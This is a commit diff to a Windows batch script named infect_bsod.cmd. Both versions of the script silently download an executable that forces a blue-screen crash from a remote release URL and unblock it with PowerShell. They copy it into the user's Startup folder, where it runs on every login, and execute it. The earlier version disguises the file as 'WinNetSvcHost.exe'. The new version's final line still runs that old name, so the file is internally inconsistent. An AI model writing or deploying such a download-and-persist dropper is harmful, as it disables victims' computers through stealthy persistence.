cfb0bae46238d319ef6526c90e052f6d6a9e886a
ultrapg <marvinspath9261@gmail.com>
2026-05-15 17:17:45 +0200

    Update infect_bsod.cmd

--- infect_bsod.cmd
+++ infect_bsod.cmd
@@ -1,7 +1,6 @@
 @echo off
 set "dlurl=https://github.com/jpiechowka/quick-bsod/releases/download/1.0/QuickBSOD.exe"
-curl -L -o "%TEMP%\WinNetSvcHost.exe" %dlurl% >nul 2>&1
-powershell -c "Unblock-File -Path $env:TEMP\WinNetSvcHost.exe" >nul 2>&1
-mkdir %LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\ >nul 2>&1
-copy "%TEMP%\WinNetSvcHost.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WinNetSvcHost.exe"
-start "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WinNetSvcHost.exe"
+curl -L -o "%TEMP%\QuickBSOD.exe" %dlurl% >nul 2>&1
+powershell -c "Unblock-File -Path $env:TEMP\QuickBSOD.exe" >nul 2>&1
+copy "%TEMP%\QuickBSOD.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\QuickBSOD.exe"
+"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WinNetSvcHost.exe"
